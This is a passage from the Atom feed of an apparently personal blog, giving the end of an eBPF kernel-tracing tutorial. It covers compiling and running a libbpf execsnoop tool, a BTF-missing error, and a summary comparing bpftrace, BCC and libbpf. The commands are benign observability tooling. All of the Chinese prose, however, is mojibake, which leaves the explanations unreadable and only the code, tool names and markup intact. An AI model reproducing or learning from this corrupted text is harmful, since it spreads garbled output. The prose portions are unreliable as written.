class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŠŠä¸Šé¢çš„ä»£ç ä¿å­˜åˆ° Â <code>execsnoop.c</code>Â  æ–‡ä»¶ä¸­ï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œå°†å…¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -Wall -I . -c execsnoop.c -o execsnoop.o</span><br><span class="line">clang -Wall -O2 -g execsnoop.o -static -lbpf -lelf -lz -o execsnoop</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œæ‰§è¡Œ <code>execsnoop</code>ï¼Œä½ å°±å¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./execsnoop</span><br><span class="line">COMM             PID    RET ARGS</span><br><span class="line">sh               276871   0 /bin/sh -c <span class="built_in">which</span> ps</span><br><span class="line"><span class="built_in">which</span>            276872   0 /usr/bin/which ps</span><br></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥ç›´æ¥æŠŠè¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°å¼€å¯äº† BTF çš„å…¶ä»–æœºå™¨ä¸­ï¼Œæ— éœ€å®‰è£…é¢å¤–çš„ LLVM å¼€å‘å·¥å…·å’Œå†…æ ¸å¤´æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œã€‚</p><p>å¦‚æœå‘½ä»¤å¤±è´¥ï¼Œå¹¶ä¸”ä½ çœ‹åˆ°å¦‚ä¸‹çš„é”™è¯¯ï¼Œè¿™è¯´æ˜å½“å‰æœºå™¨æ²¡æœ‰å¼€å¯ BTFï¼Œéœ€è¦é‡æ–°ç¼–è¯‘å†…æ ¸å¼€å¯ BTF æ‰å¯ä»¥è¿è¡Œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to load and verify BPF skeleton</span><br></pre></td></tr></table></figure><blockquote><p>è™½ç„¶è¿™ä¸‰ç§æ–¹æ³•çš„æ­¥éª¤å’Œå®ç°ä»£ç å„ä¸ç›¸åŒï¼Œä½†å®é™…ä¸Šå®ƒä»¬çš„å®ç°é€»è¾‘éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œæ— éå°±æ˜¯æ‰¾å‡ºè·Ÿè¸ªç‚¹ï¼Œç„¶ååœ¨ eBPF éƒ¨åˆ†è·å–æƒ³è¦çš„æ•°æ®å¹¶ä¿å­˜åˆ° BPF æ˜ å°„ä¸­ï¼Œæœ€ååœ¨ç”¨æˆ·ç©ºé—´ç¨‹åºä¸­è¯»å– BPF æ˜ å°„çš„å†…å®¹å¹¶è¾“å‡ºå‡ºæ¥ã€‚</p></blockquote><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œè¿™ä¸‰ç§æ–¹æ³•æœ‰ä¸åŒçš„ä½¿ç”¨åœºæ™¯ï¼š</p><ul><li>bpftrace é€šå¸¸ç”¨åœ¨<strong>å¿«é€Ÿæ’æŸ¥å’Œå®šä½ç³»ç»Ÿ</strong>ä¸Šï¼Œå®ƒæ”¯æŒç”¨å•è¡Œè„šæœ¬çš„æ–¹å¼æ¥å¿«é€Ÿå¼€å‘å¹¶æ‰§è¡Œä¸€ä¸ª eBPF ç¨‹åºï¼›</li><li>BCC é€šå¸¸ç”¨åœ¨<strong>å¼€å‘å¤æ‚çš„ eBPF ç¨‹åº</strong>ä¸­ï¼Œå®ƒå†…ç½®çš„å„ç§å°å·¥å…·ä¹Ÿæ˜¯ç›®å‰åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ eBPF å°ç¨‹åºï¼›</li><li>libbpf æ˜¯<strong>ä»å†…æ ¸ä¸­æŠ½ç¦»å‡ºæ¥çš„æ ‡å‡†åº“</strong>ï¼Œç”¨å®ƒå¼€å‘çš„ eBPF ç¨‹åºå¯ä»¥ç›´æ¥åˆ†å‘æ‰§è¡Œï¼Œä¸å†éœ€è¦åœ¨æ¯å°æœºå™¨ä¸Šéƒ½å®‰è£… LLVM å’Œå†…æ ¸å¤´æ–‡ä»¶ã€‚</li></ul><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œä½ å¯ä»¥ç”¨ bpftrace æˆ– BCC åšä¸€äº›å¿«é€ŸåŸå‹ï¼ŒéªŒè¯ä½ çš„è®¾è®¡æ€è·¯æ˜¯ä¸æ˜¯å¯è¡Œï¼Œç„¶åå†åˆ‡æ¢åˆ° libbpf ï¼Œå¼€å‘å®Œå–„çš„ eBPF ç¨‹åºåå†å»åˆ†å‘æ‰§è¡Œã€‚è¿™æ ·ï¼Œä¸ä»… eBPF ç¨‹åºè¿è¡Œå¾—æ›´å¿«ï¼ˆæ— éœ€ç¼–è¯‘æ­¥éª¤ï¼‰ï¼Œè¿˜é¿å…äº†åœ¨è¿è¡Œç¯å¢ƒä¸­å®‰è£…å¼€å‘å·¥å…·å’Œå†…æ ¸å¤´æ–‡ä»¶ã€‚</p><p>åœ¨ä¸æ”¯æŒ BTF çš„æœºå™¨ä¸­ï¼Œå¦‚æœä¸æƒ³åœ¨è¿è¡Œ eBPF æ—¶ä¾èµ–äº LLVM ç¼–è¯‘å’Œå†…æ ¸å¤´æ–‡ä»¶ï¼Œä½ è¿˜å¯ä»¥å‚è€ƒå†…æ ¸ä¸­çš„ Â BPF ç¤ºä¾‹ï¼Œç›´æ¥å¼•ç”¨å†…æ ¸æºç ä¸­çš„ <code>tools/lib/bpf/</code>Â  åº“ï¼Œä»¥åŠå†…æ ¸å¤´æ–‡ä»¶ä¸­çš„æ•°æ®ç»“æ„ï¼Œæ¥å¼€å‘ eBPF ç¨‹åºã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF å†…æ ¸è·Ÿè¸ªï¼ŒeBPF å­¦ä¹ ï¼ˆå››ï¼‰&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
</feed>
